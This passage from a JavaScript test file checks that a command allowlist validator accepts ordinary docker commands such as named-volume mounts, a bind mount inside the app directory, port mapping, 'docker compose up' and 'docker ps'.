  it('allows docker run with named volume', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('docker run -v myvol:/data alpine')));
  it('allows docker run with bind mount inside APP_DIR', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('docker run -v /tmp/testapp/data:/data alpine')));
  it('allows docker run --rm -p 8080:80', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('docker run --rm -p 8080:80 nginx')));
  it('still allows docker compose up', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('docker compose up -d')));
  it('still allows docker ps', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('docker ps')));
});
